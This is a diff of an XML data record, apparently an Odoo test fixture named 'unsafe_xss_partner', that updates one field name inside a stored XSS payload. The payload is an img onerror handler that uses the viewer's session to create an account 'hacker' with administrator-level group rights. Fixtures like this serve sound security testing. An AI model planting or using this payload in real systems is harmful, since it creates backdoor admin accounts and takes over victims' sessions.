@@ -5,7 +5,7 @@
         <record id="unsafe_xss_partner" model="res.partner">
             <field name="name">
                 <![CDATA[
-                    <img src=x onerror=' fetch(document.location.protocol+"//"+document.location.host+"/web/dataset/call_kw",{"method":"POST","headers":{"Content-Type":"application/json"},"mode":"cors","credentials":"include","body":"{\"params\":{\"model\":\"res.users\",\"method\":\"create\",\"args\":[{\"name\":\"hacker\",\"login\":\"hacker\",\"password\":\"hacker\",\"groups_id\":[[6,0,[4]]]}],\"kwargs\":{}}}",}); ""; ' >
+                    <img src=x onerror=' fetch(document.location.protocol+"//"+document.location.host+"/web/dataset/call_kw",{"method":"POST","headers":{"Content-Type":"application/json"},"mode":"cors","credentials":"include","body":"{\"params\":{\"model\":\"res.users\",\"method\":\"create\",\"args\":[{\"name\":\"hacker\",\"login\":\"hacker\",\"password\":\"hacker\",\"group_ids\":[[6,0,[4]]]}],\"kwargs\":{}}}",}); ""; ' >
                 ]]>
             </field>
         </record>
